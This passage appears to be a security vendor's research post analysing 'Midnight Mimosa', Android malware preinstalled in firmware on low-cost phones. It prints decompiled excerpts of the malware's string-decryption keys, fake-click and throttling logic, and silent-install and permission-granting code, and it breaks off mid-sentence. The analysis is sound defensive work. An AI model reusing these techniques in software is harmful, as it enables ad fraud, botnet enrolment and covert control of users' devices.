","whitepapers","A malware campaign disguised as an “undetected” version of the Xeno Roblox script executor is directly affecting players looking to download a legitimate tool.","Bitdefender security researchers have discovered that attackers continue to exploit Microsoft HTML Application Host (MSHTA), a legacy utility available by default on Windows systems that can execute VBScript and JavaScript from local or remote files.","66d5c3d1d0ec1aefc7d721a1","Free Tools","yearly","product-updates","Product Updates","6ac4f691a89a0404d6eab85a","The phone was compromised before the user turned it on: the rise of Midnight Mimosa","midnight-mimosa-malware","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FMidnight-Mimosa-Circuit-Bloom--1-.jpg","2026-10-08T15:57:43.000+03:00","\u003Cp\u003E\u003Cem\u003EBitdefender's security researchers have identified a malware campaign (dubbed Midnight Mimosa) running on low-cost, multi-brand Android devices built on MediaTek platforms.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe malware ships preinstalled in the device firmware, and we found multiple system packages involved, depending on the device. It’s on the phone before the owner switches it on for the first time, and it can’t be uninstalled.\u003C\u002Fp\u003E\u003Cp\u003EThe malware runs with system-level privileges that allow it to silently install and remove apps, grant permissions, and load arbitrary code supplied remotely. This essentially means its operators could install and delete apps at will, tuning each device to their needs, including making them part of large botnets.\u003C\u002Fp\u003E\u003Cp\u003EThis scheme is likely designed mainly to generate revenue. The operators carry out ad and click fraud, collect device and installed-app information, and turn infected devices into residential-proxy relay nodes, making them zombies in botnets. This creates an additional revenue stream, as access to botnets for DDoS attacks is a hot commodity. The larger the botnet, the more money they can charge.\u003C\u002Fp\u003E\u003Cp\u003EThe system app itself doesn’t register the fraudulent impressions and clicks. The revenue engine is driven by the dropped cover apps, including real-looking weather, app-lock, note, and OCR apps, which load genuine ads through a legitimate ad SDK. The goal is simple: to load an invisible window on top of apps that registers ads being shown.\u003C\u002Fp\u003E\u003Cp\u003EThis system app - com.android.system.lite - was the first one identified, but it turned out to be the tip of the iceberg. As the investigation continued, we identified the same malware core shipping under a rotating set of system-sounding names, including com.android.sys.prot, com.android.sys.gmsprot and com.android.sys.bcprot.\u003C\u002Fp\u003E\u003Cp\u003EEach is a different build; some carry different signing certificates, and even different names. The package name is not the threat. The shared core underneath it is.\u003C\u002Fp\u003E\u003Cp\u003ETo top it off, we also discovered 13 apps currently present on Google Play that communicate with the same servers that control the malware. While these apps don’t have the rights that would allow them to be as malicious as the preinstalled packages, they are dangerous nonetheless.\u003C\u002Fp\u003E\u003Ch2 id=\"key-findings\"\u003EKey findings\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EThe core of the infection chain is a platform-signed, persistent system application found pre-installed on affected Android devices.\u003C\u002Fli\u003E\n\u003Cli\u003EThe enabler silently deploys a rotating family of at least 32 unique disguised apps, including fake AppLock, weather, file-manager, icon-tool, OCR, and audio-editors.\u003C\u002Fli\u003E\n\u003Cli\u003EIt grants itself dangerous permissions such as Accessibility, Notification Access and SMS read\u002Fwrite - we noticed neither of these to be used in practice, but they're available to the operator on demand (arbitrary remote code loading). Our insights also show that Accessibility and Notification Access are automatically and repeatedly granted and ungranted after a short while.\u003C\u002Fli\u003E\n\u003Cli\u003EThe malware disables the Google Play Store app just before installing a payload app (probably attempting to avoid a potential Play Protect detection). After the payload runs, the Google Play Store app is re-enabled. There's also a safety net that re-enables the app when the user is present, to avoid triggering suspicions.\u003C\u002Fli\u003E\n\u003Cli\u003EPayloads perform hidden ad fraud and automated click fraud or turn the device just another part of large botnets.\u003C\u002Fli\u003E\n\u003Cli\u003EThe system app and payload family use shared infrastructure, including a command-and-control service disguised as a weather API.\u003C\u002Fli\u003E\n\u003Cli\u003EThe enabler is not a single package. The same core ships under several system-sounding names across different builds and signing certificates.\u003C\u002Fli\u003E\n\u003Cli\u003EThe same ad-fraud code was also found in thirteen applications published on Google Play, under at least two developer accounts and thirteen separate signing certificates.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe investigation began with App Anomaly Detection, a technology in Bitdefender Mobile Security, which flagged com.android.system.lite: a package carrying the name and appearance of a core system component while behaving like nothing of the sort.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture1-1.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"273\" height=\"621\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EMost mobile security still runs on a single assumption: scan an app, and if it's deemed clean, it's safe. Bitdefender's App Anomaly Detection (introduced in 2023) exists because, in practice, the theory often doesn’t hold up.\u003C\u002Fp\u003E\u003Cp\u003EApps can sit dormant and turn hostile weeks later, sometimes only if certain conditions are met (targeted malware). Such apps can pass every static check, only to later pull their real payload from a server or cleverly unpack it from native code.\u003C\u002Fp\u003E\u003Cp\u003EApp Anomaly Detection closes this gap by watching what apps do, continuously, on the device itself - combining on-device machine learning, \u003Ca\u003Ereal-time behavioral analysis\u003C\u002Fa\u003E, and a range of other signals. It doesn't rely on whether an app looked clean yesterday; it reacts to the behavior itself, catching apps red-handed the moment they cross the line from benign to malicious.\u003C\u002Fp\u003E\u003Cp\u003EThat real-time behavioral analysis made all the difference. The application was preinstalled as a system app (platform-signed). It’s impossible to uninstall; there’s no store review, and it’s not the user’s choice. Every user-facing defense had already been bypassed by the time the phone was switched on. Behavior was the only thing left to catch it by.\u003C\u002Fp\u003E\u003Cp\u003EFrom there, Bitdefender's insights showed what it had been doing. The system app was silently installing and removing a rotating set of payloads on the same devices, among them com.mobile.applock.wt, an app presenting itself as an App Lock tool, while missing the functionality its name suggested.\u003C\u002Fp\u003E\u003Cp\u003EThere’s no interface or code that would let it work as the name suggests, and it was completely hidden from the user. This was, in fact, a highly obfuscated Dropper malware in its own right - but it was not the root cause of the infection.\u003C\u002Fp\u003E\u003Cp\u003EThat is exactly how this investigation began. On paper, nothing about com.android.system.lite invited a careful second look: a platform-signed component disguised as part of the operating system, with no icon and no visible behavior, its actual machinery buried in a native library that only came to life at runtime.\u003C\u002Fp\u003E\u003Cp\u003E&nbsp;App Anomaly Detection flagged com.android.system.lite because while it posed as a core Android component, it didn’t behave like one. It repeatedly enabled sensitive access, including Accessibility and Notification Access, and silently installed and removed unrelated applications.\u003C\u002Fp\u003E\u003Cp\u003EBy following these highly suggestive crumbs, the researchers discovered the malware’s source: a persistent, pre-installed system app that could not be removed by the user.\u003C\u002Fp\u003E\u003Cp\u003EThe supposedly system component was actually managing a rotating portfolio of hidden payloads, including fake AppLock apps used for ad fraud and for enrolling devices into a residential-proxy botnet.\u003C\u002Fp\u003E\u003Cp\u003EThe same source was installing a wider cluster of payloads, including com.mobile.applock.en, com.dmstudio.weather, com.dl.guard.lock, appicon.diy.tools.prop and picturetranslate.extractor.text.lite.\u003C\u002Fp\u003E\u003Cp\u003EOur insights reveal these payload applications being installed and removed repeatedly on the same devices. This churn helps the operation reduce the length of time a payload remains visible in the app list, rotate hashes, and change the active monetization module, while the underlying system component stays in place.\u003C\u002Fp\u003E\u003Cp\u003EBeyond generating revenue for operators, the devices can be turned into residential-proxy relay nodes, essentially becoming part of botnets and potentially helping launch DDoS attacks when called upon.\u003C\u002Fp\u003E\u003Cp\u003EThe payloads themselves are not new, and this method of shipping malware \u003Ca href=\"https:\u002F\u002Fsecurelist.com\u002Fkeenadu-android-backdoor\u002F118913\u002F\"\u003Ehas been detailed in the past\u003C\u002Fa\u003E, but \u003Cstrong\u003Ethis specific campaign\u003C\u002Fstrong\u003E — the com.android.system.lite enabler found on devices with firmware signed using certificates attributed to \u003Cstrong\u003EShenzhen Zediel\u003C\u002Fstrong\u003E, delivering malicious apps, some of which are similar to those from Dr.Web’s \u003Cstrong\u003EAndroid.Phantom\u003C\u002Fstrong\u003E operator’s family, now \u003Cstrong\u003Ewith residential proxyware added.\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EWe can only confirm that certificates bearing the name Shenzhen Zediel were used to sign firmware on affected devices. However, how these certificates ended up on those phones — and whether the certificate owner was involved in or aware of the malware deployment — remains unclear. Furthermore, this is not the only company name that appeared in our investigation.\u003C\u002Fp\u003E\u003Cp\u003EThe malware ships with the device. What remains unclear is at which point in the supply chain it is integrated. It could be introduced by an ODM, a firmware integrator, a logistics partner, or another actor further down the distribution chain. The malware arrives in the ROM before the phone is sold, but identifying the specific party responsible for its inclusion requires information beyond the scope of this technical analysis.\u003C\u002Fp\u003E\u003Cp\u003EAnd this is not the only way this malware gets onto people’s devices. There are countless other phones, as we’ll show in this research, that don’t have Zediel-signed firmware and still ship with the same malware.\u003C\u002Fp\u003E\u003Cp\u003EThe internet is flooded with extremely cheap, and sometimes straight-up counterfeit, Android phones. One way to make the money back on hardware sold that cheaply is to load it with software that earns afterwards.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002F5--off-2---10--off-3---15--off-4-or-more.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1673\" height=\"863\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F10\u002F5--off-2---10--off-3---15--off-4-or-more.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F10\u002F5--off-2---10--off-3---15--off-4-or-more.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F10\u002F5--off-2---10--off-3---15--off-4-or-more.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002F5--off-2---10--off-3---15--off-4-or-more.png 1673w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ECounterfeit flagship devices are offered on a mainstream marketplace. Model names of this kind, such as S24 Ultra, S25 Ultra, S26 Ultra, appear in our insights as the model strings reported by low-cost MediaTek hardware.\u003C\u002Fp\u003E\u003Ch2 id=\"technical-analysis\"\u003ETechnical analysis\u003C\u002Fh2\u003E\u003Cp\u003ESince the core apps are very similar, we’ll detail only \u003Cstrong\u003Eone \u003C\u002Fstrong\u003Eof the malicious system apps we found and reveal how the ecosystem works.\u003C\u002Fp\u003E\u003Cp\u003EThe culprit, com.android.system.lite, is a pre-installed Android system application. It is not a normal app: and it ships signed for the platform, runs as the system user, and has the rights to install and remove packages and grant permissions to other apps without any user interaction.\u003C\u002Fp\u003E\u003Cp\u003EThese powers aren't implemented in its own APK code as they are hidden inside a native library (libeasy.so), which, at load time, RC4-decrypts and drops an obfuscated Java framework into the system-uid process.\u003C\u002Fp\u003E\u003Cp\u003EThat framework fetches a remote configuration from a C2 (command &amp; control server), then downloads and loads stage-2 and stage-3 DEX plugins that carry the actual monetization payloads:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003EIn-process ad fraud: fabricated ad impressions\u002Fclicks (the “wz” plugin).\u003C\u002Fli\u003E\n\u003Cli\u003ESilent install\u002Funinstall of partner apps as system-uid (“earn” \u002F “gogo.third” plugins), with silent permission grants.\u003C\u002Fli\u003E\n\u003Cli\u003EThe partner apps it drops are themselves known droppers: a TCP proxyware\u002Fbotnet (applock.en) and an ad-fraud+RCE dropper (applock.wt).\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EInsights confirm that one enabler silently installs a rotating portfolio of these partner apps onto real devices. The enabler is the on-device root of the whole scheme.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture3.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1430\" height=\"809\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F10\u002FPicture3.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F10\u002FPicture3.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture3.png 1430w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"the-system-app-enabler\"\u003EThe system app (enabler)\u003C\u002Fh2\u003E\u003Cp\u003EThe enabler app is a core, persistent, platform-signed system component that declares a set of privileged permissions. This is the foundation for everything that follows — only a platform-signed system-uid app can hold these permissions:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Epackage: com.android.system.lite   versionCode=900000   label=\"System\" \n&lt;manifest ... sharedUserId=\"android.uid.system\"  coreApp=true&gt; \n  &lt;application android:persistent=\"true\" ...&gt; \n  uses-permission: android.permission.INSTALL_PACKAGES \n  uses-permission: android.permission.DELETE_PACKAGES \n  uses-permission: android.permission.GRANT_RUNTIME_PERMISSIONS \n  uses-permission: android.permission.WRITE_SECURE_SETTINGS \n  uses-permission: android.permission.MOUNT_UNMOUNT_FILESYSTEMS \n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EAndroidManifest.xml of the enabler (aapt2 dump). sharedUserId=android.uid.system + coreApp + persistent = firmware system component; the privileged permissions are what enable silent install\u002Funinstall and silent permission granting.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe app label is the generic “System” and the icon is hidden. It’s invisible in the launcher and indistinguishable from a legitimate OS component. Its own APK dex (com.gogo.bb.sdk \u002F Monitor* services) is only a thin host shell; the dangerous logic lives in the bundled native library.\u003C\u002Fp\u003E\u003Cp\u003ECapability beyond what was observed\u003C\u002Fp\u003E\u003Cp\u003EThe manifest also requests access that has nothing to do with installing applications. Alongside the install and grant permissions, the enabler declares Accessibility Service, Notification Access, and SMS permissions. Even more interesting is that it enables the Accessibility and Notification Access services itself rather than prompting the owner to do so.\u003C\u002Fp\u003E\u003Cp\u003EWe didn’t see either used during the analysis. That’s worth noting, but it’s also worth not dismissing. An Accessibility Service can read the content of every screen, observe what is typed, and act on the interface on the owner's behalf. It is the standard mechanism behind Android banking trojans and remote-control fraud.\u003C\u002Fp\u003E\u003Cp\u003ENotification Access allows reading any notification, including those from chat apps. SMS access allows one-time codes to be read and messages to be sent to premium numbers. These permissions are held by a component that cannot be uninstalled and already loads code from a remote server whose operator lineage includes premium-SMS subscription fraud.\u003C\u002Fp\u003E\u003Cp\u003EThe capability is present, self-enabled and remotely armable. What is done with it is a decision the operator makes at the C2, not a property of the samples we analyzed.\u003C\u002Fp\u003E\u003Ch2 id=\"native-core-libeasyso-drops-a-hidden-framework\"\u003ENative core libeasy.so drops a hidden framework\u003C\u002Fh2\u003E\u003Cp\u003Elibeasy.so registers a single JNI method (nativeInit) whose real body is hidden behind a branch trampoline. At initialization, it caches Java crypto handles, then RC4-decrypts a 142 KB APK embedded in the library and writes it to disk. The dropped APK is the privileged framework.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003EJNI_OnLoad: FindClass(\"org\u002Fb\u002Fc\u002Flib\u002FMainLib\"); RegisterNatives(off_69000, 1) \n  JNINativeMethod { name=\"nativeInit\", signature=\"()I\", fnPtr=0xF764 } \n\n0xF764  nativeInit (registered ptr)  -&gt;  b 0x115AC        ; trampoline \n0x115AC real nativeInit body         -&gt;  \"rz.init.done.\" + \"20240425\" \n0x10910 init worker (guard @0x697F8, returns -101 if already init) \n0x10940 crypto bootstrap  (caches Cipher \u002F SecretKeySpec \u002F Base64 \u002F String) \n0x107C4 blob dropper  -&gt;  RC4-decrypt blob@0x3949E (len 0x22D60)  -&gt;  write APK \n        RC4 key = last 16 bytes of the blob;  native string key = \"rc4@sec[.]com\"\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003Elibeasy.so load chain (IDA offsets; ET_DYN, imagebase 0 so file offset = vaddr). The family build tag 20240425 is assembled in nativeInit.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe dropped APK is cn.kw.lib.hex (215 classes), a string-obfuscated framework. Its strings are AES-128-CFB encrypted:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Eg.b(x) = base64-decode(x) -&gt; AES\u002FCFB\u002FNoPadding decrypt \n         key = MD5(\"aGV4QCFRQFcjRQ==\")   (= \"hex@!Q@W#E\") \n         IV  = \"0102030405060708\"\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EString cipher of the embedded framework. Same construction as the enabler’s own string cipher (key “dHhAZXhAc2Vy”) — a shared-code tie.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"the-two-privileged-primitives-grant-rce\"\u003EThe two privileged primitives (grant + RCE)\u003C\u002Fh2\u003E\u003Cp\u003EThe dropped framework implements the two advertised powers that are absent from the APK dex:\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EGrant any permission to any package:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F hex.c.b.a(ctx, pkg, perm) — reflected privileged grant \nPackageManager.grantRuntimePermission(pkg, perm, UserHandle)   \u002F\u002F + getUserHandleForUid \n\u002F\u002F enumerates third-party targets and verifies the grant: \npm list package -3 ; checkPermission(perm, pkg)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EGrant primitive (decoded strings of the embedded dex: “grantRuntimePermission pkg:”, “pm list package -3”). Fully parameterized by target ⇒ it can grant to any foreign package, not just itself.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003ERemote DEX\u002FJAR update = remote code execution:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003Ecn.kw.lib.dx.DxFactory via dalvik.system.DexClassLoader\u003Cbr\u003Edownloads\u002Fupdates kwlib.jar (+ kwlib.next), md5-checked, version-gated (isNeedUdx, lst_udx_tim) endpoints come from remote config (getNavigation), not hardcoded.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cem\u003ERCE loader. Endpoints are supplied by the C2 config at runtime.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"stage-2-stage-3-plugins-and-the-on-device-plugin-store\"\u003E\u003Cstrong\u003EStage-2 \u002F stage-3 plugins and the on-device plugin store\u003C\u002Fstrong\u003E\u003C\u002Fh2\u003E\u003Cp\u003EThe framework pulls a stage-2 host (kwlib.jar → cn.kw.lib.dx.DxFactory) which then loads three stage-3 plugins. Each plugin is cached under files\u002Fplg\u002F&lt;id&gt;\u002F as magic.o (a JAR disguised with a .o extension) plus a descriptor:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Efiles\u002Fplg\u002F&lt;md5-id&gt;\u002Fmagic.o        &lt;- PK\\x03\\x04  (a ZIP\u002FJAR, not a .o) \nfiles\u002Fplg\u002F&lt;md5-id&gt;\u002Fmagic.o[.]info: \n20311###magic###com.wz.sdk.DxFactory###magic###0bed0405...(md5 of jar) \n      ###magic###1782294f...(iconDesc)###magic###^(wtd|com.wz.sdk|com.ads.cal|com.android.gem|...).+\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EA plugin descriptor. The version + iconDesc values match exactly what the C2 returned in getConfigs — the plugin store is C2-provisioned.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth\u003EPlugin (entry class)\u003C\u002Fth\u003E\n\u003Cth style=\"text-align:right\"\u003EVersion\u003C\u002Fth\u003E\n\u003Cth\u003ERole\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.wz.sdk.DxFactory\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd style=\"text-align:right\"\u003E20311\u003C\u002Ftd\u003E\n\u003Ctd\u003EIn-process ad fraud, including fake clicks and impressions\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.earnsdk.lib.DxFactory\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd style=\"text-align:right\"\u003E5\u003C\u002Ftd\u003E\n\u003Ctd\u003ESilent installation and removal of partner apps (PPI)\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.gogo.third.lib.DxFactory\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd style=\"text-align:right\"\u003E10014\u003C\u002Ftd\u003E\n\u003Ctd\u003ESilent installer with WebView functionality\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Ch2 id=\"the-ad-fraud-scheme-comwzsdk\"\u003E\u003Cstrong\u003EThe ad-fraud scheme (com.wz.sdk)\u003C\u002Fstrong\u003E\u003C\u002Fh2\u003E\u003Cp\u003EThe wz plugin renders ads where the owner has not asked for them. It uses two surfaces: full-screen activities, launched without the user having opened anything, and overlay windows drawn on top of whatever is already on screen. Rendering is triggered by screen-state changes, such as the display coming on, or by commands pushed across the ad mesh while the device sits idle.\u003C\u002Fp\u003E\u003Cp\u003EThe ad surface is also marked as secure, so it doesn’t appear in screenshots or screen recordings. That flag exists to protect sensitive content, such as banking screens, from being captured. Here it’s used in reverse: to make the fraudulent ad surface hard for the owner, or for anyone analyzing the device, to record.\u003C\u002Fp\u003E\u003Cp\u003EThe fraud itself is parameterized by a remote config whose Kotlin field names are cleartext:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Eclass RemoteConfig {   \u002F\u002F com.ads.cal.core.RemoteConfig (@Metadata field names) \n  int silentPercent;      \u002F\u002F % of ads to ‘click’ with NO user touch \n  int notClickPercent;    \u002F\u002F % of impressions to auto-convert \n  int notClickInterval;   \u002F\u002F min ms between fabricated clicks \n  int notClickTopRate, notClickBottomRate, notClickLeftRate, notClickRightRate; \u002F\u002F fake touch placement \n  int livePercent, weight, priority; String mediaPkgName, adspotId; }\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EThe fraud ‘knobs’. silentPercent \u002F notClickPercent are the probabilities of registering a click with no real tap; notClick*Rate bias is where on the creative the synthetic touch lands to look human.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EProgrammatic (synthetic) click — no user involved:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F wtd\u002Fp\u002Fn0.java:192  — code-driven click fired from a Runnable \npublic void onClick(View view) { b.this.h.performClick(); }\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ERandom target + daily cap + interval throttle (paces the fake traffic to look organic):\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F wtd\u002Ff\u002Fs.java  r(Context) \nint nextInt = random.nextInt(f.size());   \u002F\u002F random ad target from C2 list \nint l = e.l();  int d = e.d();            \u002F\u002F today’s fabricated count \u002F daily cap \nif (l &gt;= d) { B(3); return; }             \u002F\u002F cap reached -&gt; stop \nif (elapsedRealtime - this.h &lt; e.c()) return;  \u002F\u002F interval not elapsed -&gt; skip \nw.post(this.i);                            \u002F\u002F fire the interaction runnable\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ETap → silent deep-link launch of the promoted app:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F wtd\u002Ff\u002Fs.java  t(MotionEvent)  — an incidental tap becomes a click on the advertiser app \nIntent intent = new Intent();           \u002F\u002F silently launches the target\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ETime-based automatic ‘conversion’ report with a silent flag (60 s after show, no interaction):\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F wtd\u002Ff\u002Fe.java \nif (nVar2.p().get() == p.b &amp;&amp; elapsedRealtime - nVar2.h().get() &gt;= 60000) { \n    f Q = Q(str, longValue, EnumC0017e.b, h0Var, false, z.v(str)); \n    k0.l.s(a2, Q);         \u002F\u002F upload the (fabricated) interaction event \n} \n\u002F\u002F wtd\u002Ff\u002Fc.java:251 — the upload carries an explicit ‘silent’ boolean \nwtd.m.c.F(iVar.i(), iVar.d(), nVar.t(), nVar.p() \u002F*silent*\u002F, s1, s2, s3);\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EThe full fabrication path: render ad → performClick()\u002FstartActivity to fake clicks → auto-report ‘conversions’ after a 60 s timer with silent=true → throttle via silentPercent\u002FnotClickPercent\u002Fdaily-cap. All events go to DotReporter → weatherlive.world\u002Fodborwer_dot\u002Fcm.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"who-gets-billed\"\u003EWho gets billed\u003C\u002Fh2\u003E\u003Cp\u003EFabricated clicks only earn money if an ad network attributes them to somebody, and attribution follows the ad SDK. The network credits an impression and a click to the application hosting its SDK and its ad unit identifiers. A hidden system component carrying no ad SDK would produce traffic that attributes to nothing and pays nobody.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EThat’s why the scheme needs the cover apps. The weather, app-lock, note and OCR applications the enabler installs are ordinary-looking apps carrying a legitimate ad SDK, and they are what the ad network sees. This is consistent with the wz plugin running inside the system process: the plugin supplies the logic, the timing and the synthetic interaction, while the ad unit, and therefore the payment, belongs to the cover app.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EThe two are bound peers in an ad mesh. Each cover app exports MyDataService under the action com.media.am.intent.action.BIND_SERVICE, a controller binds them and pushes ad payloads and commands across the mesh (initMediaApp, setAdData, transferData), and all of them report the same device identifier to the same weatherlive C2. One application can therefore drive impressions and clicks that another application renders and is paid for.\u003C\u002Fp\u003E\u003Cp\u003EThe division of labor across the scheme:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003ESystem enabler: silently installs and removes the partner apps, grants them permissions, and blinds Play Protect around each install. Hosts no ad units and is billed for nothing.\u003C\u002Fli\u003E\n\u003Cli\u003ENative core and hidden framework: decrypt and load the privileged framework, and provide the permission-grant primitive and the remote code update channel.\u003C\u002Fli\u003E\n\u003Cli\u003EStage-2 and stage-3 plugins: C2-provisioned modules that run the fraud logic in process and perform the silent installs\u003C\u002Fli\u003E\n\u003Cli\u003EDropped cover apps: the revenue engine, and the only part of the scheme an ad network ever sees.\u003C\u002Fli\u003E\n\u003Cli\u003ENo-icon droppers: separate monetization tracks, proxyware and a second ad-fraud module.\u003C\u002Fli\u003E\n\u003Cli\u003EC2: module control, fraud configuration, and collection of the fabricated events.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"silent-install-and-permission-laundering\"\u003ESilent install and permission laundering\u003C\u002Fh2\u003E\u003Cp\u003EThe earn\u002Fgogo plugins silently install partner apps. The decision entrypoint and the install routine are the malware’s own code; it runs because the host holds INSTALL_PACKAGES as system-uid:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F earndex.e.f.d(ctx, assets, pkg, version, str2) -&gt; new com.earnsdk.lib.a(...).h() \n\u002F\u002F com.earnsdk.lib.a.h(): if needInstall -&gt; \nAppInstallHelper.c(ctx, assetManager, \"mediaapp-release.apk\", pkg, str3); \n\u002F\u002F AppInstallHelper.c -&gt; earndex.h.c.a() copies the bundled APK out of assets -&gt; earndex.h.f.g(): \n\u002F\u002F earndex.h.c.l(context, pkg, path):  PackageInstaller session (silent on system-uid) \nSessionParams sp = new SessionParams(MODE_FULL_INSTALL); \nint sid = pi.createSession(sp); Session s = pi.openSession(sid); \ns.openWrite(...); s.commit(intentSender);   \u002F\u002F no user prompt\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003ESilent-install path (com.earnsdk.lib.AppInstallHelper + earndex.h.c\u002Ff). Legacy installPackage(Uri,…) reflection is also present for older Android; on Android 13 the PackageInstaller session path is operative.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EBecause the host process holds INSTALL_PACKAGES as the system user, the createSession → openWrite → commit sequence completes with no PackageInstaller confirmation UI, and the enabler is recorded as the installing package. No user interaction is required at any point of the install.\u003C\u002Fp\u003E\u003Cp\u003EPermission laundering: because the enabler installs the app, it can also silently grant it permissions a normal store app can never hold. The dropped weather cover app declares and actively uses WRITE_SECURE_SETTINGS — a signature (privileged) development 